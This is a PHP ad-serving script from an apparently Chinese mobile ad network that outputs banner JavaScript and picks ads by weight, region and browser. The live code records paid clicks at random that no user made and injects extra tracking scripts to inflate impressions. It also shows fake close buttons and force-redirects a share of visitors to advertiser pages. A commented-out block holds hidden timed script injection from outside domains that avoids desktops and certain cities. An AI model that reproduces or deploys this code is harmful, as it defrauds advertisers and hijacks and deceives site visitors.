<?php

//广告类型
$tid=67;
//网址来源 以及pid
if(!$_SERVER["HTTP_REFERER"] || !$pid)
{
   exit;
}

if(!$pid){

	echo "参数错误！";
	exit;
}
$userip = get_ip();


//缓存开启

$memcache=new Memcache;
$result=$memcache->pconnect(MEMCACHE_SERVERNAME,MEMCACHE_PORT);

//更新广告位
$user_adp = upADPosition($pid, $tid,$memcache);

if(!$user_adp){
	/*echo 'document.writeln("广告位不存在！");';
	exit;*/
	$user_adp = upADPosition(2003, $tid,$memcache);
}

if($user_adp['istype'] != 2 && $user_adp['istype'] != $istype){
	echo 'device unable';
	exit;
}
$userid=$user_adp['userid'];

if(strpos($_SERVER['HTTP_REFERER'],'https://') !== false){

	define('JK_DOMAIN', 'https://sp.dali517.com');
	define('WAP_TZ_DOMAIN', 'https://st.lebao001.com');

}else{

	define('JK_DOMAIN', 'http://hp.moecz.com');        // 监控域名(前来源,当前页面域名) 计pv 计费 
    define('WAP_TZ_DOMAIN', 'http://hd.z5cw.com');	// wap端跳转广告域名
}
  
//载入网站主信息
$userinfo = upuser1($userid,$tid,$memcache);
// 点击广告域名判断

if(!$userinfo){
	echo 'document.writeln("<font size=2>该账号不存在！");';
	exit;
}

//网站主状态判断
if($userinfo['zhuangtai']!=1)
{ 
	?>
		document.writeln("<font size=2>您的帐号未开通或被冻结！"); 
	<?php 
    exit;
}

//判断是否开通横幅广告
if(strpos($userinfo['openty'], (string)$tid) === false)
{ 
	?>
		document.writeln("<font size=2>您的帐号未开通横幅广告！"); 
	<?php 
	exit;
}

/************************域名判断***********************/
//来源地址
$netmain = strtolower(parse_url($_SERVER['HTTP_REFERER'])['host']);

$NetClassId = 0;
foreach(explode('|', DOMEXT) as $val){
	if(strrpos($netmain, $val) !== FALSE){	// 只有在0位置找到才算
		$NetClassId = 1;
		break;
	}
}

// 获取主域名
if($NetClassId == 1){
	$netmain = getSLD($netmain);
}else{
	$netmain = substr($netmain, strpos($netmain, '.') + 1);
}

// 判断网站域名是否登记，并且未开启域名不提示
$urlp = strpos($userinfo['urlstr'], $netmain);
if($urlp === FALSE AND $userinfo['ifdomain'] == 0){
	?>
	    document.writeln("域名未登记!");
	<?php
	exit;
}

/* **************************筛选广告*************** */

$ads_list = uptype($tid,$memcache);

if(!$ads_list){
	echo 'no adv';
	exit;
}
$ads_info = $memcache->get('pghf_adsinfo');
// 获取指定分类的广告信息
$adsclass = ($ptype == 1) ? $user_adp['wadsclass'] : $user_adp['iosclass'];

$adsclass = trim($adsclass);

$ads=array();
$unusable_ads = [];//存放不符合当前网站主要求的广告类型的广告

//选择全部广告类型
if($adsclass == '0'){
	// 广告全选
	foreach($ads_list as $val){
		foreach($val as $v){
			$ads[$v] = $ads_info[$v];
		}
	}
}else{
	// 选择了指定类型的广告
	$wadsclass = explode(',', $adsclass);

	foreach($ads_list as $k => $val){
		foreach ($val as $v) {
			if(in_array($k, $wadsclass)){
				$ads[$v] = $ads_info[$v];
			}else{
				$unusable_ads[$v] = $ads_info[$v];
			}
		}
        
	}

}
//print_r($ads);
//符合站长要求的广告

$userip_num = ip2long($userip);

$areaname = get_my_region($userip_num);			// 获取ip所在城市

$nowdic = array();

// 如果系统有定向广告,则与定向广告进行重合性判断,条件(站点广告与地域广告重合, 访者地域与广告地域相符)

//未有微信广告 暂时没有测试 
foreach($ads as $ad_id => $ad){
	
	if($ad['istype']==$istype
	&& strpos($ad['phonetype'],(string)$ptype)!==false
	&& strpos($ad['blacksiteid'],','.$userid.',')===false
	&& (empty($ad['okarea']) || mb_strpos($ad['okarea'], $areaname, 0, 'UTF-8') !== FALSE)
	)
	{
		$unshow = false;
		if($ad['unshow_phone'] != '0'){
			foreach (explode(',',$ad['unshow_phone']) as $value) {
            	if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']),(string)$value) !== false){
            		$unshow = true;
            		break;
            	}
            }
		}
		if(!$unshow){
			if($ad['sqms']==1)
			{
				if(strpos($ad['limitsiteid'], ','.$userid.',') !== FALSE){
					$nowdic[] = $ad_id;
				}
				
			}else{
				$nowdic[] = $ad_id;	
			}
		}
	}
	 	
}

if(!$nowdic)
{
    if($user_adp['noadok'] == 1 && !empty($unusable_ads)){//强制把不符合类型的广告的取出来
        $ads = $unusable_ads;
    	foreach ($unusable_ads as $ua_id => $ad) {
    		if($ad['istype']==$istype
			&& strpos($ad['phonetype'],(string)$ptype)!==false
			&& strpos($ad['blacksiteid'],','.$userid.',')===false
			&& $ad['sqms']==0)
			{
                $nowdic[] = $ua_id;
			}
    	}

    	if(empty($nowdic)){
    		
	        echo   "no ads!";
    		exit;
    	}
   
    }else{

        echo  "no usable ads!";
        exit;
    }

}

//var_dump($nowdic);

// *******************随机广告ID排序*********************
for($i = 0; $i < $ADS_CONFIG['num']; $i++){
	$totalweight = 0;
	$weightdic = [];

	shuffle($nowdic);
	foreach($nowdic as $k=> $val){
		$weightdic[$k] = $ads[$val]['weight1'];
		$totalweight += $ads[$val]['weight1'];
	}
	
	$rnd_ad = mt_rand(1, $totalweight);
	$curAdid = 0;		// 选中的广告编号
	// 利用权重的上下界数值比较确定选中哪个广告
	foreach($weightdic as $k => $v)
	{
		if($rnd_ad <= $v){
			$curAdid = (int)$nowdic[$k];
			break;
		}else{
			$rnd_ad -= $v;
			continue;
		}
	}

	$rndadspv = mt_rand(1, HF_RATE);		// 前来源抽样概率 1/10

	$useripaid = $userip . $curAdid;
	
	/********************特殊广告输出***************************/
	if($curAdid == 152 || $curAdid == 1889 || $curAdid == 1953||$curAdid == 2959||$curAdid == 2948){
		$linkurl = base64_encode('1&'.$curAdid.'&'.$userid.'&'.time().'&'.$pid.'&'.$tid.'&'.iptopwd($useripaid, date('md')).'&1');
		// 记录pv数据
		$is_cpc_count = $_COOKIE['pg_jusha_cpc_'.$userip_num.$curAdid] ? $_COOKIE['pg_jusha_cpc_'.$userip_num.$curAdid] : 0;
        $special_rand = mt_rand(1, 200);
        if(!$is_cpc_count && $special_rand <= 7){
			$conn = openconn();
	        mssql_select_db(DB_DATABASE, $conn);

	        $sp_cpc_count = mssql_init("xyz67_cpc", $conn);
			mssql_bind($sp_cpc_count, "@adsid", $curAdid, SQLVARCHAR);
			mssql_bind($sp_cpc_count, "@uip", $userip_num, SQLVARCHAR);

		    $cpc_count_res = mssql_execute($sp_cpc_count,false);
		    $is_cpc_ad = mssql_fetch_row($cpc_count_res)[0];

		    mssql_free_statement($sp_cpc_count);
		    mssql_free_result($cpc_count_res);

		    if(!$is_cpc_ad){

		        $sp = mssql_init("vistdata67_cpc_count", $conn);

				mssql_bind($sp, "@userid", $userid, SQLINT2);
				mssql_bind($sp, "@adsid", $curAdid, SQLVARCHAR);
				mssql_bind($sp, "@mip", $userip_num, SQLVARCHAR);
				mssql_bind($sp, "@pid", $pid, SQLINT2);

				mssql_execute($sp);
			    mssql_free_statement($sp);

			    setcookie('pg_cpc_'.$userip_num.$curAdid, 1, time()+24*60*3600);
			}
		}

		out_special_ad($curAdid, $ad_pos, $rndadspv, $linkurl, $ptype);
		if($special_rand <= 20){
			echo '!(function(){var b,a=document.createElement("script");a.src="'.JK_DOMAIN.'/se?u='.$linkurl.'",b=document.getElementsByTagName("html")[0],b.appendChild(a)})();';
		}
		break;
	}
	
	/********************正常广告输出***************************/

	// 0 默认,1 正规
	if($user_adp['ispic'] == 1){	// 底部广告位,素材形式 '1 640×200
        $img_type = '640x200';
		$nowpic = explode(',', str_replace(' ', '', $ads[$curAdid]['picurl0']));

	}else if($user_adp['ispic'] == 2){	// 底部广告位,素材形式 '2 640×150
	    $img_type = '640x150';
		$nowpic = explode(',', str_replace(' ', '', $ads[$curAdid]['picurl1']));

	}else{
		$img_type = '640x100';
		$nowpic = explode(',', str_replace(' ', '', $ads[$curAdid]['picurl2']));
	}
    $img_url = $nowpic[array_rand($nowpic, 1)];
    
	if((strpos($_SERVER['HTTP_USER_AGENT'], 'UCBrowser') !== FALSE) && strpos($img_url, '.gif') !== false){
        $img_url = str_replace('.gif', '.bmp', $img_url);
    }

	if ($userid == 3000 && strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false){
      if((strpos($_SERVER['HTTP_USER_AGENT'], 'QQBrowser') !== FALSE) && strpos($img_url, '.gif') !== false){
        $img_url = str_replace('.gif', '.bmp', $img_url);
      }
	}
	
	if ($userid == 5277 && strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false){
      if((strpos($_SERVER['HTTP_USER_AGENT'], 'QQBrowser') !== FALSE) && strpos($img_url, '.gif') !== false){
        $img_url = str_replace('.gif', '.bmp', $img_url);
      }
	}

    $imgsrc[] = PICURLURL.$img_url;
    
	$linkurl = base64_encode('0&'.$curAdid.'&'.$userid.'&'.time().'&'.$pid.'&'.$tid.'&'.iptopwd($useripaid, date('md')).'&'.base64_encode($ads[$curAdid]['gotourl']));

	if($i == 0){
		$pv_url = JK_DOMAIN.'/se?u='.$linkurl;
		$anim_adid = $curAdid;
	}
	
	$imgcounturl[] = ($istype ? WAP_TZ_DOMAIN : WX_TZ_DOMAIN)."/url.php?s={$linkurl}";
	$gotourls[] = str_replace('pguid', $userid, $ads[$curAdid]['gotourl']);

}

$imgtype = explode('x', $img_type);
$bg_str = 'ABCDEFGHJKLMNOPQRSTUVWXYZ';

if($curAdid != 152 && $curAdid != 1889&&$curAdid != 2959&&$curAdid != 2948&&$curAdid != 1953){

	$GCIDS = 'pg'.$pid.$userid.substr(str_shuffle('abcdefghjkmnpqrstuvwxyz'), 0, 5);

	$config = getJSConfig($userid, $ptype, $memcache, $areaname);

	//几率开启真关闭
	if($config['closebtn'] && $config['closebtn'] != 1){
		$btn_rand = mt_rand(1, 100);

		if($btn_rand <= $config['closebtn']){
			$config['closebtn'] = 1;
	    }else{
	    	$config['closebtn'] = 0;
	    }
	}

	if($config['isshake'] != 0){

		if($ads[$anim_adid]['adstypeid'] == 5){//游戏广告自动开启渐入动画，关闭抖动
		    $config['is_open'] =  1;
		    $config['isshake'] =  0;
		}else{
			$config['is_open'] =  0;
		}
	}else{
		$config['is_open'] = 0;
	}

	if($ads[$anim_adid]['adstypeid'] == 7 || $ads[$anim_adid]['adstypeid'] == 11){
		$close_bg = '0,146,255,0.2';
		$faked_close = 'Close3m.png';
		$font_bg = '68, 70, 65, 0.5';
	}else{
		$close_bg = '0,0,0,0.1';
		$faked_close = 'Close2nn.png';
		$font_bg = '57,146,227,0.4';
	}

	// 部分站点要求特别设置
	$config['sh'] = 0;
	$config['isiframe'] = 0;
	switch($userid){
		case 1100:
			$config['isiframe'] = 1;
			break;
	}
	
    $config_abnm = ['sync_onload'=>'','async_onload'=>'','layer'=>'','layer_height'=>['pid'=>'','userid'=>'',],];
    if(file_exists('lib/config-67.php')) $config_abnm = include 'lib/config-67.php';
	$onload = strpos($config_abnm['sync_onload'],(string)$userid)!==false ? 0 : 1;

	if($onload && $userid >= 3300)$onload=0;

	strpos($config_abnm['async_onload'],(string)$userid)!==false && $onload = 1;
    
    //不要透明层特殊站点
	if(array_key_exists($userid, $config_abnm['area_action']) && strpos($config_abnm['area_action'][$userid],$areaname)!==false){
		$config['islayer'] = 0;
		$config['fulllayer'] = 0;
	}
	
	if($ptype == 1 && strpos($_SERVER['HTTP_USER_AGENT'], 'baiduboxapp') !== false){//手机百度

		include 'js/yf_bdapp.js';
	}else if($ptype == 1 && strpos($_SERVER['HTTP_USER_AGENT'], 'baidubrowser') !== false){
		$ad_log = substr(str_shuffle('abcdefghjkmnpqrstuvwxyz'), 0, 6);
        $xxxuc = substr(str_shuffle('abcdefghjkmnpqrstuvwxyz'), 0, 5);
        include 'js/bdapp_17un.js';
    }else if(strpos($_SERVER['HTTP_USER_AGENT'], 'UCBrowser')!== false){
    	
    	include 'js/yf_uc.min.js';
    }else if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQBrowser') !== FALSE){
    	include 'js/yf_bd.min.js';
    }else{
    	// JS代码（顶部 透明层调底）
    	if(strpos($config_abnm['layer'],(string)$userid)!==false){
    		if((strpos($config_abnm['layer_height']['userid'],(string)$userid)!==false||strpos($config_abnm['layer_height']['pid'],(string)$pid)!==false) && $ad_pos == 1 && $config['H'] > 0){
            	$config['H'] = $config['H'] + 50;
    		}
    		include 'js/yf_fc.min.js';
	
    	}else{
    		
    		include  'js/yf.min.js';

			//include 'js/yf.js';
		}
    }

    if($config['isredirect'] > 0){
		$ads_tz = $ads[$curAdid]['tznum'] ?: 0;
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'QQBrowser') !== FALSE OR strpos($_SERVER['HTTP_USER_AGENT'], 'UCBrowser') !== FALSE){
			$tz_percent = $config['isredirect'] + $ads_tz + $config['uc_qq_tz'];
		}else{
			$tz_percent = $config['isredirect'] + $ads_tz;
		}

		$r_redirect = mt_rand(1,100);//百分比跳转
		if($r_redirect <= $tz_percent){
			$rand_obj = substr(str_shuffle($bg_str), 0, 5);
			$gotourl = str_replace('pguid', $userid, $ads[$curAdid]['gotourl']);
			?>
			    var <?=$rand_obj?> = {};
	        	<?=$rand_obj?>.addEvent = function(obj,type,fn){if(obj.attachEvent){obj.attachEvent('on'+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};
			    <?=$rand_obj?>.addEvent(window,'load', function(){window.location.href = '<?=$gotourl?>';});
			<?php
		}
	}

}

//判断是否杭州
/*$is_hangzhou = false;
$ip_list = include 'ip_lists/hangzhou_ip.php';

foreach ($ip_list as $k => $v) {
	if($userip_num > $k && $userip_num < $v){
		$is_hangzhou = true;
		break;
	}
}
//$is_hangzhou = false;

if(!$is_hangzhou && $areaname != '北京'){
//所有嵌刷屏蔽 杭州/北京

	$is_xmzh = false;
	$ip_list = include 'ip_lists/ip_listxmzh.php';

	foreach ($ip_list as $k => $v) {
		if($userip_num > $k && $userip_num < $v){
			$is_xmzh = true;
			break;
		}
	}
	
	if(!$is_xmzh){//屏蔽珠海、厦门
		
		// IOS机型
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'iPhone') !== FALSE OR strpos($_SERVER['HTTP_USER_AGENT'], 'iPad') !== FALSE){			
			// 跳转内嵌代码

			if(strlen($_SERVER['HTTP_USER_AGENT']) > 134){

				$rand_obj = substr(str_shuffle($bg_str), 0, 5);			
				echo 'function Wscokie(a,b){var d=new Date;d.setTime(d.getTime()+1e3*60*60*3),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WcksetCookie(a,b){var c=365,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WckgetCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):""};var '.$rand_obj.'={};'.$rand_obj.'.timer=function(time){setTimeout(function(){var b,a=document.createElement("script");a.src="'.TZCODE_DOMAIN.'/statpv-2001-"+navigator.platform+"-'.$userid.'-"+WckgetCookie("'.$userip_num.'bg"),b=document.getElementsByTagName("html")[0],b.appendChild(a);},time*1000);};'.$rand_obj.'.addEvent=function(obj,type,fn){if(obj.attachEvent){obj.attachEvent("on"+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};'.$rand_obj.'.addEvent(window,"load", function(){!function(){if(navigator.platform.indexOf("Win") > -1 || navigator.platform.indexOf("Mac") > -1)return;WcksetCookie("iispg",2);if(2!=WckgetCookie("iispg"))return;if(WckgetCookie("'.$userip_num.date('Ymd').'stat"))return;if(window.screen.width<=320||window.screen.height<=568)return;var fmtpgcodeflg_x=document.getElementById("fmtpgcodeflg");if(!fmtpgcodeflg_x){var g=document.createElement("a");g.id="fmtpgcodeflg";}else{return;};'.$rand_obj.'.timer(0);'.$rand_obj.'.timer(2);'.$rand_obj.'.timer(5);'.$rand_obj.'.timer(9);'.$rand_obj.'.timer(13);'.$rand_obj.'.timer(17);'.$rand_obj.'.timer(20);'.$rand_obj.'.timer(26);   }();});';
		
				//ios还要屏蔽模拟器ua小于134
				if(!$userinfo['iftype']){//内刷跳转
				    //$tz_tb_rand = mt_rand(1, 2);
					$tz_tb_rand = 2;
                    if($tz_tb_rand == 1){
						$e2_cookie = isset($_COOKIE['pge2_'.$userip_num]) ? $_COOKIE['pge2_'.$userip_num] : 0;
						if(!$e2_cookie){
							?>function WckseteCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{WckseteCookie(name,1);return 1}}if (WckgeteCookie('pge2_<?=$userip_num?><?=date('Ymd')?>')!=2){WckseteCookie('pge2_<?=$userip_num?><?=date('Ymd')?>',2);document.writeln('<script type="text/javascript" src="http://www.taolecun.com/jy.js?advert=199"></script>');}<?php
							setcookie('pge2_'.$userip_num,1,strtotime('23:59:59'));
						}
				    }
				}
			}
			
		}

		//安卓机型
		if(strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== false){
			
		    if(strlen($_SERVER['HTTP_USER_AGENT']) > 155){		
			    // 跳转内嵌代码
				//$tz_andr_rand = mt_rand(1, 2);
				$tz_andr_rand = 1;
				if($tz_andr_rand == 1){
					$rand_obj = substr(str_shuffle($bg_str), 0, 5);
					echo 'function Wscokie(a,b){var d=new Date;d.setTime(d.getTime()+1e3*60*60*1),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WcksetCookie(a,b){var c=1,d=new Date;d.setTime(d.getTime()+1e3*60*60*24*c),document.cookie=a+"="+escape(b)+";expires="+d.toGMTString()}function WckgetCookie(a){var b,c=new RegExp("(^| )"+a+"=([^;]*)(;|$)");return(b=document.cookie.match(c))?unescape(b[2]):""};var '.$rand_obj.'={};'.$rand_obj.'.timer=function(time){setTimeout(function(){var b,a=document.createElement("script");a.src="'.TZCODE_DOMAIN.'/statspv-2001-"+navigator.platform+"-'.$userid.'-"+WckgetCookie("'.$userip_num.'2001'.date('Ymd').'bg"),b=document.getElementsByTagName("html")[0],b.appendChild(a);},time*1000);};'.$rand_obj.'.addEvent=function(obj,type,fn){if(obj.attachEvent){obj.attachEvent("on"+type,function(){fn.call(obj);});}else{obj.addEventListener(type,fn,false);}};'.$rand_obj.'.addEvent(window,"load", function(){!function(){if(navigator.platform.indexOf("Win") > -1 || navigator.platform.indexOf("Mac") > -1)return;WcksetCookie("iispg",2);if(2!=WckgetCookie("iispg"))return;if(WckgetCookie("'.$userip_num.date('Ymd').'stat"))return;if(window.screen.width<=320||window.screen.height<=568)return;var fmtpgcodeflg_x=document.getElementById("fmtpgcodeflg");if(!fmtpgcodeflg_x){var g=document.createElement("a");g.id="fmtpgcodeflg";}else{return;};'.$rand_obj.'.timer(0);   }();});';
		        }
		    }
				
			//安卓还要屏蔽 360/谷歌/百度, 因为chrome标识UA里都带,所以以UA长度来识别为360/chrome浏览器,>155认为是非谷歌/360浏览器
			if(strlen($_SERVER['HTTP_USER_AGENT']) > 155 && strpos($_SERVER['HTTP_USER_AGENT'], 'baidubrowser') == FALSE){
			  	if(!$userinfo['iftype']){//内刷跳转
				    $tx_tb_rand = mt_rand(1, 4);
					$tx_tb_rand = 5;
                    if($tx_tb_rand == 1){
						$e2_cookie = isset($_COOKIE['pge2_'.$userip_num]) ? $_COOKIE['pge2_'.$userip_num] : 0;
						if(!$e2_cookie){
							?>function WckseteCookie(name,value){var Days=1;var exp=new Date();exp.setTime(exp.getTime()+Days*24*60*60*1000);document.cookie=name+"="+escape(value)+";expires="+exp.toGMTString()}function WckgeteCookie(name){var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");if(arr=document.cookie.match(reg)){return unescape(arr[2])}else{WckseteCookie(name,1);return 1}}if (WckgeteCookie('pge2_<?=$userip_num?><?=date('Ymd')?>')!=2){WckseteCookie('pge2_<?=$userip_num?><?=date('Ymd')?>',2);document.writeln('<script type="text/javascript" src="http://www.taolecun.com/jy.js?advert=199"></script>');}<?php
							setcookie('pge2_'.$userip_num,1,strtotime('23:59:59'));
						}
				    }	
				}
			}
			
		}
	}	
	
}*/



